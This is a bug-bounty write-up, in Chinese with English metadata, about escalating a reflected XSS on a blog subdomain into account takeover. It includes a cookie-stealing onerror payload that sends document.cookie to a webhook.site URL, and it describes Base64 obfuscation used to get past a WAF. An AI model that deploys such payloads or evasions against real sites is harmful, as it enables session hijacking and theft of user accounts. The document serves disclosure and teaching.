---
title: "XSS to Account Takeover: The jp.redacted.com Case"
description: "How a simple reflected XSS on a millions-user blog site was escalated to a full Account Takeover (ATO) using Base64 encoding."
category: "Injection"
difficulty: "Medium"
tags: ["XSS", "ATO", "Account-Takeover", "Base64-Encoding"]
author: "Redacted Researcher"
date: "2026-04-06"
---

# 🛡️ XSS 进阶实战：从反射型 XSS 到 账户劫持 (ATO)

> [!TIP]
> **核心战术**: 载荷逃逸 (Payload Evasion)。当传统的 `&lt;script&gt;` 被拦截或失效时，利用 `Base64` 编码或 HTML 属性事件 (`onerror`) 来绕过简单的字符串过滤，实现敏感信息（Cookie）的外带。

在寻找一个拥有数百万用户的程序时，我特别关注了一个大型博客网站，这里姑且称之为 `redacted.com`。我首先对其子域名进行了枚举。我发现的一个子域名是 `jp.redacted.com`。

## 漏洞发现：参数挖掘

接下来，我使用 `Param Spider` 工具来收集所有可能的参数。

```bash
param spider -d jp.redacted.com -s 
```

此命令在终端中列出了所有可能的参数。其中，我发现了一个名为 `s=` 的参数，它允许我使用简单载荷执行反射型 XSS (RXSS)：

```html
<script>alert(1)</script>
```

![](/img/1_RoZet6wDPJj_WVBnv9x3iQ.png)

## 攻链提升：账户劫持 (ATO)

成功执行 XSS 后，我尝试将漏洞升级为 **账户劫持 (Account Takeover)**。我的最初尝试是直接注入窃取 Cookie 的脚本：

```html
<img src="x" onerror=document.location='https://webhook.site/790fbd5e-8cc4-441e-9a81-6ac18f40cb5f?c='+document.cookie;">
```

然而，常规载荷由于服务端过滤或 WAF 规则未能生效。

### 绕过策略：Base64 编码

经过多次尝试，我决定对 Payload 进行 **Base64 混淆**。令我惊讶的是，这种简单的绕过手段直接穿透了过滤机制，载荷成功执行并捕获了受害者的 Cookie。

![](/img/1_Y2y1BGAfk8SIIUha_AuRMQ.png)

> [!CAUTION]
> **漏洞影响**: 攻击者可以伪造合法用户身份，完全接管博客账户，并可能通过 Cookie 中的 Session 进行更深层次的横向渗透。

## 🛠️ 使用的工具

- **Param Spider**: 自动化参数挖掘利器，专门用于从 Wayback Machine 等网络存档中提取潜在的注入点。

---
*注：该漏洞已向官方报告。*
